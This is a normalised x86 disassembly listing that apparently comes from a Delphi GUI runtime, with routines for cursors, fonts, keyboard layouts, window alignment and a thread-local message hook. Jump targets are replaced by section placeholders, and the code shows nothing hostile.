mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_45a428
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421838
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421838
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421838
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_45e42c
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45e308
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45e308
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45e308
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_45dda8
push ebx
push esi
push edi
push ebp
call sub_4034f8
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_40316c
mov eax [ ebp + 0x88 ]
call sub_40316c
mov eax [ ebp + 0x84 ]
call sub_40316c
mov eax [ ebp + 0x54 ]
call sub_40316c
mov eax [ ebp + 0x50 ]
call sub_40316c
mov eax [ ebp + 0x4c ]
call sub_40316c
mov eax [ ebp + 0x30 ]
call sub_40316c
mov eax [ ebp + 0x34 ]
call sub_40316c
mov eax [ ebp + 0x7c ]
call sub_40316c
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_40316c
mov eax ebp
call sub_45e068
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41e724
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4034e0
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_417e94
call sub_40316c
inc edi
dec esi
jne r-xdata
sub_45df20
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_45df6c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_417d38
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_417d38
mov eax [ rw-data ]
call sub_460cf8
sub_45dfa4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418030
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418030
mov eax [ rw-data ]
call sub_460cf8
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_4479e4
sub_45e00c
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_45e0c4
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_45e068
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026fc
mov ebx esi
test ebx ebx
jne r-xdata
sub_45e0c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026dc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_45e0ec
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45e297
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e29e
lea eax [ ebp - 0x260 ]
call sub_403f40
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403f40
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41a310
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_409098
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_44b1e8
test al al
je r-xdata
xor eax eax
push ebp
push sub_45e253
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4041b0
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4041b0
sub_45e308
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_460b68
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46091c
mov dl 0x1
mov eax [ rw-data ]
call sub_46091c
sub_45e374
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_45e39c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_45e374
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406cec
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406c74
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45e42c
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_45e571
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46091c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_421bc8
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_421bc8
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_421cac
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_421bc8
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_421bc8
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_421bc8
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_46091c
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_421a0c
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_421a0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e578
cmp [ rw-data ] 0x0
je r-xdata
sub_45e5b0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_45e610
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_45e74c ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_45e7c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45df18
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_417e94
mov dl [ ebp - 0x1 ]
call sub_45e610
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_45df04
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_417d38
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_417f10
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_417e94
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_45e5b0
test al al
je r-xdata
inc esi
sub_45e90c
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45df18
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_45df04
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_45e964
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_45e90c
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45e9de
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_45e7c0
pop ecx
push ebp
mov al 0x2
call sub_45e7c0
pop ecx
push ebp
mov al 0x3
call sub_45e7c0
pop ecx
push ebp
mov al 0x4
call sub_45e7c0
pop ecx
push ebp
mov al 0x5
call sub_45e7c0
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40316c
retn
sub_45e9ec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e580
xor eax eax
push ebp
push sub_45ea65
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45e964
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_45e588
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45ea80
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403f40
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403f94
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_45ead8
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_40360c#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_460f24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45eb2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_43e428
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_460fa0
sub_45eb88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_460040
sub_45ebcc
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_45eb88
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_45eb2c
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_45ec40
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_45ec9c
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_45eccc
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_45ecf4
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_45ec9c
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_45eccc
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_45eccc
sub_45ed34
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41e6d8
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403490
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46040c
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281dc
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_4285ac
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_460ba4
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c808
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_460604
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c830
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408a8c
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_4041b0
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_460d80
mov eax ebx
call sub_461744
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_45f03c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_45ef1d
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4034f8
mov ebx edx
mov esi eax
mov eax esi
call sub_461754
mov [ esp + 0x4 ] esi
